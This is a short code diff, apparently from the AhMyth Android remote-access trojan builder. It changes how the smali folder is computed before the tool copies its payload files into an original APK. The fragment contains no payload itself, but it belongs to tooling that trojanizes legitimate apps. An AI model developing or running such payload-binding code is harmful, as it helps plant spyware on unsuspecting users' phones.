@@ -231,7 +231,11 @@ process.on('uncaughtException', function (error) {
                                 return;
                             }
 
-                            var smaliFolder = (launcherPath.split("/")[0] + "/");
+                            var regex = /[^/]+\//;
+                            var str = (apkFolder, launcherPath);
+                            var m = str.match(regex);
+
+                            var smaliFolder = m[0];
 
                             $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                             $appCtrl.Log();
